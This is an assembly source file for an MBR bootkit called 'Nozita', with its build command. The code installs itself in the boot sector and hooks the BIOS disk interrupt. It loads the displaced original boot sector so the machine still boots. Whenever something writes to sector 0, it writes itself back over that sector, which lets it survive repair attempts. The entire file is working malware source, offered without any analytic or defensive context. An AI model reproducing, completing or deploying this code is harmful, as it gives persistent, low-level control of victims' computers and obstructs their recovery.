; mbr.asm — Nozita MBR Bootkit (BIOS/CSM)
; nasm -f bin -o mbr.bin mbr.asm

BITS 16
ORG  7C00h

RELOC   equ  0500h
OSEC    equ  62

_start:
    cli
    xor   ax, ax
    mov   ds, ax
    mov   es, ax
    mov   ss, ax
    mov   sp, 7BFEh
    sti
    cld
    mov   [7C00h + _drive - _start], dl

    mov   si, 7C00h
    mov   di, RELOC
    mov   cx, 100h
    rep   movsw

    db    0EAh
    dw    RELOC + (_main - _start)
    dw    0000h

_main:
    mov   bx, RELOC

    cli
    mov   ax, [004Ch]
    mov   [bx + _o13o - _start], ax
    mov   ax, [004Eh]
    mov   [bx + _o13s - _start], ax
    mov   word [004Ch], RELOC + (_hook - _start)
    mov   word [004Eh], 0000h
    sti

    lea   si, [bx + _dapL - _start]
    mov   ah, 42h
    mov   dl, [bx + _drive - _start]
    int   13h

    mov   dl, [bx + _drive - _start]
    jmp   0000h:7C00h

_hook:
    cmp   ah, 43h
    jne   .chain

    mov   eax, [si + 8]
    or    eax, [si + 12]
    jnz   .chain

    push  ax
    push  bx
    push  cx
    push  dx
    push  si
    push  di
    push  ds
    push  es

    cmp   byte [cs: RELOC + (_lock - _start)], 1
    je    .chain_saved

    mov   byte [cs: RELOC + (_lock - _start)], 1

    pop   es
    pop   ds
    pop   di
    pop   si
    pop   dx
    pop   cx
    pop   bx
    pop   ax

    pushf
    call  far [cs: RELOC + (_o13o - _start)]

    push  ax
    push  si
    push  ds
    push  es
    xor   ax, ax
    mov   ds, ax
    mov   es, ax
    mov   si, RELOC + (_dapW - _start)
    mov   ah, 43h
    xor   al, al
    mov   dl, [cs: RELOC + (_drive - _start)]
    pushf
    call  far [cs: RELOC + (_o13o - _start)]
    pop   es
    pop   ds
    pop   si
    pop   ax

    mov   byte [cs: RELOC + (_lock - _start)], 0
    iret

.chain_saved:
    pop   es
    pop   ds
    pop   di
    pop   si
    pop   dx
    pop   cx
    pop   bx
    pop   ax

.chain:
    jmp   far [cs: RELOC + (_o13o - _start)]

_drive: db  80h
_lock:  db  0
_o13o:  dw  0
_o13s:  dw  0

_dapL:  db  10h,00h
        dw  0001h
        dw  7C00h, 0000h
        dq  OSEC

_dapW:  db  10h,00h
        dw  0001h
        dw  RELOC, 0000h
        dq  0

        times 446 - ($ - $$) db 0
ptable: times 64             db 0
        dw    0AA55h
